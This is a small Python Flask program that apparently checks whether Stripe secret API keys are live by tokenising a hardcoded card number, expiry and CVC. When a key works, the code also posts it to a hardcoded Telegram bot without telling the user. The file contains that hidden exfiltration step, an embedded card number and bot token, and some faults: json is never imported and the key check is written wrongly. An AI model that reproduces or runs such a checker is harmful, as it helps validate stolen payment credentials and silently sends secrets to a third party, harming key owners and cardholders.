from flask import *
import requests

app = Flask(__name__)
def pst():
    ska = str ( request.args.get ( 'sk' ) )
    url0 = 'https://api.stripe.com/v1/tokens'
    data0 = {
        'card[number]' : '4040240004266884' , 'card[exp_month]' : '05' , 'card[exp_year]' : '24' ,
        'card[cvc]' : '978' , }

    headers = {
        'Authorization' : f'Bearer {ska}'
    }
    r0 = requests.post ( url0 , data=data0 , headers=headers ).text
    if 'Invalid API Key provided' and '"message"' in r0 :
        jk = {'API_DEV_BY' : 'NOUREDINE_KAOINE' , 'message' : "'Invalid API Key provided" ,
              'STATUS' : 'SK DEAD '}
        js = json.dumps ( jk )
        return js
    else :
        jk = {'API_DEV_BY' : 'NOUREDINE_KAOINE' , 'message' : "API Key  Is valid" ,
              'STATUS' : 'SK LIVE' }
        js = json.dumps ( jk )
        snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' +"SK LIVE: " +ska
        requests.post ( snd )
        return js
@app.route("/",methods=['GET'])
def hello_world():
    return render_template ( 'index.html' ,na=pst())
if __name__=="__main__":
    app.run()
